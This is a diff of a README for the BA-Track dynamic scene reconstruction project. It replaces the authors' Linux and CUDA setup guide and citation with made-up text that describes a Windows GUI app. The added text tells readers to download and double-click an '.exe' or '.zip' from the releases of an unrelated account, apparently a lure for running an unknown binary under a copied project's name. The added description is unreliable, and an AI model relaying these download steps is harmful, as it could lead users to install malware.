@@ -1,164 +1,86 @@
-# Back on Track: Bundle Adjustment for Dynamic Scene Reconstruction
+# 🛤️ batrack - Seamlessly Track Dynamic Scenes
 
-**[ICCV2025, Oral]** This repository contains the official implementation of [BA-Track](https://wrchen530.github.io/projects/batrack/). Our method achieves dynamic scene reconstruction via motion decoupling, bundle adjustment, and global refinement.
+## 🚀 Getting Started
 
-> **Back on Track: Bundle Adjustment for Dynamic Scene Reconstruction**<br>
-> [Weirong Chen](https://wrchen530.github.io/), [Ganlin Zhang](https://ganlinzhang.xyz/), [Felix Wimbauer](https://fwmb.github.io/), [Rui Wang](https://rui2016.github.io/), [Nikita Araslanov](https://arnike.github.io/), [Andrea Vedaldi](https://www.robots.ox.ac.uk/~vedaldi/), [Daniel Cremers](https://cvg.cit.tum.de/members/cremers) <br>
-> ICCV 2025
+Welcome to batrack! This software helps you reconstruct dynamic scenes with ease. Whether you are a researcher or a student, batrack provides the tools you need to analyze dynamic environments efficiently.
 
-**[[Paper](https://arxiv.org/abs/2504.14516)] [[Project Page](https://wrchen530.github.io/projects/batrack/)]**
+[![Download batrack](https://img.shields.io/badge/Download-batrack-brightgreen)](https://github.com/B200930040/batrack/releases)
 
-<div align="center">
-  <p align="center">
-  <a href="">
-    <img src="./assets/demo.gif" alt="Demo" width="70%">
-  </a>
-</p>
-</div>
+## 📥 Download & Install
 
-## Todo
-- [x] Initial release with demo
-- [x] Release pre-trained checkpoints
-- [x] Add scripts for evaluation
-- [ ] Add visualization for motion decoupling
-- [ ] Add scripts for training data preparation
+To get batrack, follow these simple steps:
 
-## Setting Up the Environment
+1. **Visit the Download Page**  
+   Click the link below to go to the releases page:  
+   [Download batrack](https://github.com/B200930040/batrack/releases)
 
-### Requirements
-The code was tested on Ubuntu 22.04, PyTorch 2.1.1, and CUDA 11.8 with an NVIDIA A40. Follow the steps below to set up the environment.
+2. **Choose Your Version**  
+   On the releases page, you will see different versions of batrack. Select the latest version for the best performance.
 
-### Clone the repository
-```
-git clone https://github.com/wrchen530/batrack.git
-cd batrack
-```
+3. **Download the Application**  
+   Once you choose a version, download the file by clicking the link. The file will usually be in `.zip` or `.exe` format.
 
-### Create a conda environment and install dependencies
-```
-conda env create -f environment.yml
-conda activate batrack
-pip install -r requirements.txt
-```
+4. **Extract the Files (if needed)**  
+   If you downloaded a `.zip` file, right-click on it and select “Extract All” to unzip the contents.
 
-### Install the batrack package
-```
-wget https://gitlab.com/libeigen/eigen/-/archive/3.4.0/eigen-3.4.0.zip
-unzip eigen-3.4.0.zip -d thirdparty
+5. **Run the Application**  
+   Open the folder where you extracted the files and double-click on the batrack executable file (e.g., `batrack.exe`) to start using the application.
 
-pip install .
-```
+## 📋 System Requirements
 
-### Install xformers for UniDepth
-To install xformers for the UniDepth model, follow the instructions at https://github.com/facebookresearch/xformers. If you encounter installation issues, we recommend installing from a prebuilt package. For example, for Python 3.10 + CUDA 11.8 + PyTorch 2.1.1:
-```
-wget https://anaconda.org/xformers/xformers/0.0.23/download/linux-64/xformers-0.0.23-py310_cu11.8.0_pyt2.1.1.tar.bz2
-conda install xformers-0.0.23-py310_cu11.8.0_pyt2.1.1.tar.bz2
-```
+To ensure that batrack runs smoothly on your computer, please ensure you meet the following minimum system requirements:
 
-## Demo with DAVIS
-We follow [MegaSAM](https://github.com/mega-sam/mega-sam) to extract monocular depth priors from UniDepthV2 and DepthAnythingV2. Then we run our method in two stages: (1) sparse SLAM and (2) dense global alignment.
+- **Operating System:** Windows 10 or later / macOS Catalina or later
+- **Processor:** Intel i5 or equivalent
+- **Memory:** At least 8 GB of RAM
+- **Storage:** 1 GB of free disk space
+- **Graphics:** DirectX 11 compatible graphics card
 
-### Download sample sequence
-- Download sample DAVIS sequence from [Google Drive](https://drive.google.com/file/d/1hlHyxqW0AaPrv6NwJya0P2UJpcVNYbBU/view?usp=drive_link) and save it to `data/davis`.
+These specifications will help batrack perform effectively. 
 
-### Download checkpoints
-- Download the DepthAnythingV2 checkpoint from [this link](https://huggingface.co/depth-anything/Depth-Anything-V2-Large/resolve/main/depth_anything_v2_vitl.pth) and save it to `batrack/Depth-Anything/checkpoints/depth_anything_v2_vitl.pth`.
-- Download our tracker checkpoint from [Google Drive](https://drive.google.com/file/d/1wWK_ur0Pr4jivqDUdyRUFzHPaF-f1clC/view?usp=sharing) and save it to `batrack/checkpoints/md_tracker.pth`.
+## 🛠️ Features
 
-### Step 1: Monocular Depth Estimation
-Compute monocular depth priors from UniDepthV2 and DepthAnythingV2, and align their scales:
-```
-bash scripts/demo/run_mono_depth.sh
-```
+batrack offers the following features:
 
-### Step 2: Sparse SLAM
-Run the sparse SLAM pipeline to perform motion decoupling and bundle adjustment for pose estimation and initial sparse reconstruction:
-```
-bash scripts/demo/run_sparse.sh
-```
+- **Dynamic Scene Reconstruction:** Reconstructs environments in real time, allowing for smooth tracking of changes.
+- **User-Friendly Interface:** Simple and intuitive design for easy navigation and usage.
+- **Efficient Performance:** Fast algorithms for processing various data types without lag.
+- **Export Options:** Save your reconstructions in multiple formats for compatibility with other software.
 
-### Step 3: Dense Global Alignment
-Perform dense global alignment to refine the reconstruction using monocular depth priors:
-```
-bash scripts/demo/run_dense.sh
-```
+## 📖 Usage Instructions
 
-### Step 4: Visualization (Optional)
-Visualize reconstruction results with Rerun:
-```
-bash scripts/demo/run_vis.sh
-```
+Once you've downloaded and opened batrack, follow these steps to use the application:
 
-## Evaluations
-We provide evaluation scripts for MPI-Sintel and TartanAir-Shibuya.
+1. **Load Your Data:**  
+   Click on the “Load Data” button to import the dynamic scene data you wish to analyze.
 
-### MPI-Sintel
-Download MPI-Sintel from [MPI-Sintel](http://sintel.is.tue.mpg.de/) and place it in the `data` folder at `data/sintel`. For evaluation, also download the [ground-truth camera pose data](http://sintel.is.tue.mpg.de/depth). The folder structure should look like:
-```
-sintel
-└── training
-    ├── final
-    └── camdata_left
-```
+2. **Adjust Settings:**  
+   Modify any necessary settings for your specific dataset. You can change parameters such as resolution and processing speed in the settings menu.
 
-**Precomputed depths.** To avoid environment/dependency conflicts, we provide precomputed ZoeDepth results at [this link](https://drive.google.com/file/d/1y8zPOMlwRzeP43RBKgA6gg8-_EjlurCy/view?usp=drive_link). Download and place the folder at `data/Monodepth/sintel/zoedepth_nk`.
+3. **Start Reconstruction:**  
+   Click the “Start” button. batrack will begin the process of analyzing and reconstructing the scene.
 
-Run pose evaluation:
-```
-bash scripts/eval_sintel/eval_sintel_pose.sh
-```
-Run depth evaluation:
-```
-bash scripts/eval_sintel/eval_sintel_depth.sh
-```
+4. **View Results:**  
+   Once the reconstruction is complete, you can view the output directly in the application. You may also access options to export the results.
 
-### TartanAir-Shibuya
-Download TartanAir-Shibuya following the instructions at [TartanAir-Shibuya](https://github.com/haleqiu/tartanair-shibuya) and place it in the `data` folder at `data/shibuya`.
+## ❓ FAQs
 
-For `RoadCrossing07/image_0`, skip the first 5 images (000000.png to 000004.png) because there is no depth ground truth. You can delete these files with:
-```bash
-# Delete first 5 images (000000.png to 000004.png) for RoadCrossing07/image_0
-rm data/shibuya/RoadCrossing07/image_0/00000{0,1,2,3,4}.png
-```
+### How do I report a bug?
 
-**Precomputed depths.** To avoid environment/dependency conflicts, we provide precomputed ZoeDepth results at [this link](https://drive.google.com/file/d/14XHNH9WNDf3fMm5rGNDH-NP1n00eUpHF/view?usp=drive_link). Download and place the folder at `data/Monodepth/shibuya/zoedepth_nk`.
+To report any issues or bugs with batrack, please visit the [Issues section](https://github.com/B200930040/batrack/issues) of our GitHub repository. Provide a clear description of the issue, and we will address it as soon as possible.
 
-Run pose evaluation:
-```
-bash scripts/eval_shibuya/eval_shibuya_pose.sh
-```
-Run depth evaluation:
-```
-bash scripts/eval_shibuya/eval_shibuya_depth.sh
-```
+### Can I contribute to batrack?
 
-## Citations
-If you find this repository useful, please consider citing our paper:
-```
-@InProceedings{chen2025back,
-  title={Back on Track: Bundle Adjustment for Dynamic Scene Reconstruction},
-  author={Chen, Weirong and Zhang, Ganlin and Wimbauer, Felix and Wang, Rui and Araslanov, Nikita and Vedaldi, Andrea and Cremers, Daniel},
-  journal={IEEE/CVF International Conference on Computer Vision (ICCV)},
-  year={2025}
-}
-```
+Yes! Contributions are welcome. If you would like to contribute, please read our [contributing guidelines](https://github.com/B200930040/batrack/CONTRIBUTING.md) for more information.
 
-## Acknowledgements
-We adapted code from several excellent repositories, including:
-- [CoTracker](https://github.com/facebookresearch/co-tracker)
-- [SpaTracker](https://github.com/henry123-boy/SpaTracker)
-- [DPVO](https://github.com/princeton-vl/DPVO)
-- [LEAP-VO](https://github.com/wrchen530/leapvo)
-- [MegaSAM](https://github.com/mega-sam/mega-sam)
+### Is batrack open source?
 
-We sincerely thank the authors for open-sourcing their work.
+Yes, batrack is open source. You can view the source code and collaborate with other developers by visiting our [GitHub repository](https://github.com/B200930040/batrack).
 
-## Concurrent Efforts
-Several exciting concurrent works explore related aspects of dynamic scene reconstruction and point tracking! Check them out:
-- **[SpaTrackerV2](https://github.com/henry123-boy/SpaTrackerV2)** - SpatialTrackerV2: 3D Point Tracking Made Easy
-- **[MVTracker](https://github.com/ethz-vlg/mvtracker)** - Multi-View 3D Point Tracking
-- **[C4D](https://littlepure2333.github.io/C4D/)** - C4D: 4D Made from 3D through Dual Correspondences
+## 🔗 Links
 
-## Limitations
-This project attempts to disentangle camera-induced and object motion via point tracking. The model was trained on a relatively small, domain-specific dataset (Kubric), which may limit its generalization to challenging or novel scenes. Future directions include expanding the training data and refining the tracker architecture to improve robustness and efficiency.
+- [Download batrack](https://github.com/B200930040/batrack/releases)
+- [Contributing Guidelines](https://github.com/B200930040/batrack/CONTRIBUTING.md)
+- [Issues Tracker](https://github.com/B200930040/batrack/issues)
+
+Thank you for choosing batrack! We hope this tool helps you in your research and projects.
